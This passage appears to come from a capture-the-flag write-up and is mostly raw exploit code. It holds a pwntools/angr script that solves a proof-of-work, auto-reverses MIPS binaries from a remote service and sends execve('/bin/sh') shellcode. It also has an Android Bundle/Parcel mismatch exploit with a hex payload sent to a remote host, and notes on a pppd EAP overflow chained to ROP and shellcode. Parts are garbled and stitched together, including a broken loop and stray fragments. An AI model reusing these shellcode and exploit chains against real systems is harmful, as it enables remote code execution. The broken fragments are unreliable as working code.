            '8342e17221ff79ac5fdf46e63c25d99b':"\\x10\\xbd\\x00\\xac"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '51882b30d7af486bd0ab1ca844939644':'\\xbd\\x7a\\x55\\xd3',
            '8342e17221ff79ac5fdf46e63c25d99b':'\\xbc\\xbb\\xff\\x4a'
        }
    },
    "b93e4feb8889770d981ef5c24d82b6cc":{
        '21190da8c2a736569d9448d950422a7a':{
            '51882b30d7af486bd0ab1ca844939644':"\\x2f\\xfb\\xef\\x2b",
            '8342e17221ff79ac5fdf46e63c25d99b':"\\xac\\x10\\xbd\\x00"
        },
        '2a1fae6743ccdf0fcaf6f7af99e89f80':{
            '8342e17221ff79ac5fdf46e63c25d99b':'\\x4a\\xbc\\xbb\\xff',
            '51882b30d7af486bd0ab1ca844939644':'\\xd3\\xbd\\x7a\\x55'
        }
    }
}
def findhd(addr):
    while True:
        code = f[addr:addr + 4]
        if(code == "e0ffbd27".decode("hex")):
            return addr
        addr -= 4
def dejmp(code):
    c = ""
    d = Cs(CS_ARCH_MIPS,CS_MODE_MIPS32)
    for i in d.disasm(code,0):
        flag = 1
        if("b" in i.mnemonic or "j" in i.mnemonic):
            flag = 0
        #print("0x%x:\\t%s\\t%s"%(i.address,i.mnemonic,i.op_str))
        if flag == 1:
            c += code[i.address:i.address+4]
    return c
def calc(func_addr,find,avoid):
    start_address = func_addr
    state = p.factory.blank_state(addr=start_address)
    tmp_addr = 0x20000
    ans = claripy.BVS('ans', 4 * 8)
    state.memory.store(tmp_addr, ans)
    state.regs.a0 = 0x20000
    sm = p.factory.simgr(state)
    sm.explore(find=find,avoid=avoid)
    if sm.found:
        solution_state = sm.found[0]
        solution = solution_state.se.eval(ans)#,cast_to=str)
        # print(hex(solution))
        return p32(solution)[::-1]
def Calc(func_addr,find,avoid):
    try:
        tmp1 = hashlib.md5(dejmp(f[avoid - 0x80:avoid])).hexdigest()
        tmp2 = hashlib.md5(f[avoid-0xdc:avoid-0xdc+4]).hexdigest()
        tmp3 = hashlib.md5((f[avoid - 0x24:avoid-0x20])).hexdigest()
        return tb[tmp1][tmp2][tmp3]
    except:
        try:
            ret = calc(func_addr + base,find + base,avoid + base)
            return ret
        except:
            print "%s %s %s %x"%(tmp1,tmp2,tmp3,func_addr)
while True:
    try:
        os.system("rm out.gz")
        os.system("rm out")
        r = remote("106.53.114.216",9999)
        r.recvline()
        sha = r.recvline()
        sha = sha.split("\\"")[1]
        s = pow(sha)
        r.sendline(s)
        log.success("pass pow")
        r.recvuntil("===============\\n")
        dump = r.recvline()
        log.success("write gz")
        o = open("out.gz","wb")
        o.write(dump.decode("base64"))
        o.close()
        log.success("gunzip")
        os.system("gzip -d out.gz")
        os.system("chmod 777 out")
        log.success("angr")
        filename = "out"
        base = 0x400000
        p = angr.Project(filename,auto_load_libs = False)
        f = open(filename,"rb").read()
        final = 0xb30
        vd = [i.start()for i in re.finditer("25100000".decode("hex"),f)]
        vd = vd[::-1]
        chk = ""
        n = 0
        for i in range(len(vd) - 1):
            if(vd[i] ",chk)
        context.arch = 'mips'
        success(r.recvuntil("Name"))
        r.sendafter(">","g"*8)
        ret_addr = vd[1]-0x34-0x240+base
        success(hex(ret_addr))
        shellcode = 'la $v1,{};'.format(hex(ret_addr))
        shellcode += 'jr $v1;'
        shellcode = asm(shellcode)
        print(shellcode.encode('hex'))
BroadCastTest
https://xz.aliyun.com/t/2364#toc-0
        r.sendafter(">",shellcode)
        r.sendafter("Faster > ",chk)
        success(r.recvuntil("Name"))
        r.sendafter(">","gg")
        shellcode = ''
        shellcode += "\\xff\\xff\\x06\\x28"
        shellcode += "\\xff\\xff\\xd0\\x04"
        shellcode += "\\xff\\xff\\x05\\x28"
        shellcode += "\\x01\\x10\\xe4\\x27"
        shellcode += "\\x0f\\xf0\\x84\\x24"
        shellcode += "\\xab\\x0f\\x02\\x24"
        shellcode += "\\x0c\\x01\\x01\\x01"
        shellcode += "/bin/sh"
        print(len(shellcode))
        r.sendafter(">",shellcode)
        r.interactive()
    except Exception as e:
        print e
Parcel data = Parcel.obtain();
data.writeInt(4); // entries
// id
data.writeString("id");
data.writeInt(1);
data.writeInt(233);
// class
data.writeString("test");
data.writeInt(4); // value is Parcelable
data.writeString("com.de1ta.broadcasttest.MainActivity$Message");
data.writeString("233");
for(int i=0;i hidden key
data.writeInt(0); // value is string
data.writeString("aaaaaaaaaaaaaaaaaaaaaaaaaa");
data.writeString("A padding");
data.writeInt(0); // value is string
data.writeString("to match pair count");
int length = data.dataSize();
Parcel bndl = Parcel.obtain();
bndl.writeInt(length);
bndl.writeInt(0x4C444E42); // bundle magic
bndl.appendFrom(data, 0, length);
bndl.setDataPosition(0);
byte[] v4 = bndl.marshall();
TextView t = findViewById(R.id.hw);
String s = bytesToHex(v4);
exp:
from pwn import *
from hashlib import sha256
import string
pppd
context.log_level = 'debug'
def get_a(a):
    for i1 in string.printable:
        for i2 in string.printable:
            for i3 in string.printable:
                for i4 in string.printable:
                    aa = i1+i2+i3+i4
                    if sha256(a + aa).digest().startswith(b'\\0\\0\\0'):
                        print(aa)
                        return aa
# nc 206.189.186.98 8848
p = remote('206.189.186.98',8848)
payload = 
'CC010000424E444C0400000002000000690064000000000001000000E90000000400000074
0065007300740000000000040000002C00000063006F006D002E00640065003100740061002
E00620072006F0061006400630061007300740074006500730074002E004D00610069006E00
4100630074006900760069007400790024004D0065007300730061006700650000000000030
000003200330033000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000E
FBEADDE000000001D000000EFBEADDE09000000A40000000700000063006F006D006D006100
6E0064000000000000000700000067006500740066006C00610067000000000000000000000
00300000061006100610000000700000063006F006D006D0061006E0064000000000000001A
000000610061006100610061006100610061006100610061006100610061006100610061006
100610061006100610061006100610061000000000009000000410020007000610064006400
69006E0067000000000000001300000074006F0020006D00610074006300680020007000610
069007200200063006F0075006E0074000000'.decode('hex')
p.recvuntil('chal= ')
a = p.recvline()
a = a.replace('\\n','')
print(a)
p.send(get_a(a))
p.recvuntil('size')
p.sendline(str(len(payload)))
p.recvuntil('payload:')
p.send(payload)
p.interactive()
eap.c  eap_request()  EAPT_MD5CHAP  patch 
 payload→ROP→shellcode
pppd noauth local lock defaultroute debug nodetach /tmp/serial 9600
Crypto
ECDH
git clone 